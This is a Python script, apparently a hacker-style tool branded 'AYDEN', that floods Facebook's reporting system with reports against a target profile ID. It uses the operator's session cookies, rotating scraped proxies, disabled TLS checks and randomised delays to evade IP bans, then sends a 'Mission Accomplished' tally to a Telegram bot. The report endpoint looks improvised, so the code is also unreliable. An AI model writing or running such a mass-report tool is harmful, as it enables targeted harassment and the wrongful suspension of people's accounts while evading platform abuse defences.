import threading
import requests
import time
import random
import urllib3

# تعطيل التحذيرات لضمان التوافق مع DNS الآيباد
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Purple & Dark UI Colors
P = '\033[95m'  # Purple
C = '\033[96m'  # Cyan
G = '\033[92m'  # Green
R = '\033[91m'  # Red
W = '\033[0m'   # White
D = '\033[90m'  # Dark Gray

# 3D Purple Banner: AYDEN
BANNER = f"""
{P}   _____  _____.___.________  ___________ _______   
  /  _  \ \__  |   |\______ \ \_   _____/ \      \  
 /  /_\  \ /____   | |    |  \ |    __)_  /   |   \ 
/    |    \\____   | |    `   \|        \/    |    \\
\____|__  // ______|/_______  /_______  /\____|__  /
        \/ \/               \/        \/         \/ 
{D}          ── {P}SYSTEM: SPIDER-REPORT V99.3 {D}──
          ── {P}STATUS: FXCKED BY AYDEN 👹 {D}──{W}
"""

class ShadowSpider:
    def __init__(self, target_id, tg_token, tg_id, cookies):
        self.target_id = target_id
        self.tg_token = tg_token
        self.tg_id = tg_id
        self.cookies = cookies
        self.success_count = 0
        self.proxy_list = []
        self.lock = threading.Lock()

    def fetch_proxies(self):
        """سحب بروكسيات لحماية شبكة الآيباد الخاصة بك"""
        print(f"{P}[🌐] Fetching Proxies to Cloak Your Identity...{W}")
        try:
            res = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", verify=False)
            if res.status_code == 200:
                self.proxy_list = res.text.splitlines()
                print(f"{G}[✅] {len(self.proxy_list)} Proxies Loaded Under the Shadow.{W}")
        except:
            print(f"{R}[❌] Proxy Server Offline. Using Local Stealth Mode...{W}")

    def send_to_tg(self, message):
        url = f"https://api.telegram.org/bot{self.tg_token}/sendMessage"
        payload = {"chat_id": self.tg_id, "text": message}
        try: requests.post(url, data=payload, verify=False)
        except: pass

    def report_logic(self):
        url = f"https://www.facebook.com/api/report/pc/target_id={self.target_id}"
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "Cookie": self.cookies
        }
        
        proxy = {"http": random.choice(self.proxy_list)} if self.proxy_list else None

        try:
            response = requests.post(url, headers=headers, proxies=proxy, timeout=10, verify=False)
            
            if response.status_code == 200:
                with self.lock:
                    self.success_count += 1
                    print(f"{P}[⚡] Hit Sent! Total: {self.success_count} 👹{W}", end="\r")
            
            # محاكاة سلوك بشري لتجنب الـ IP Ban
            time.sleep(random.uniform(2.0, 5.0)) 
            
        except:
            pass

    def start_attack(self, threads_num):
        print(BANNER)
        self.fetch_proxies()
        print(f"{P}[🛡️] Bypassing DNS Restrictions & SSL...{W}")
        print(f"{D}-----------------------------------------{W}")
        
        threads = []
        for _ in range(threads_num):
            t = threading.Thread(target=self.report_logic)
            threads.append(t)
            t.start()
            time.sleep(0.1)

        for t in threads:
            t.join()

        final_msg = (
            "👾 Mission Accomplished!\n"
            f"👤 Target: {self.target_id}\n"
            f"💥 Total Reports: {self.success_count}\n"
            "💀 Status: Fxcked by Ayden"
        )
        self.send_to_tg(final_msg)
        print(f"\n\n{P}[💜] Reports Logged to Telegram. Mission Complete.{W}")

if __name__ == "__main__":
    print(BANNER)
    # المدخلات مع الإيموجي
    target = input(f"{P}[🔗] Target Profile ID: {W}")
    cookies = input(f"{P}[🍪] Paste Your Cookies: {W}")
    tg_token = input(f"{P}[🤖] Bot Token: {W}")
    tg_id = input(f"{P}[🆔] Your Telegram ID: {W}")
    power = int(input(f"{P}[🔥] Attack Power (Safe: 20): {W}"))

    spider = ShadowSpider(target, tg_token, tg_id, cookies)
    spider.start_attack(power)
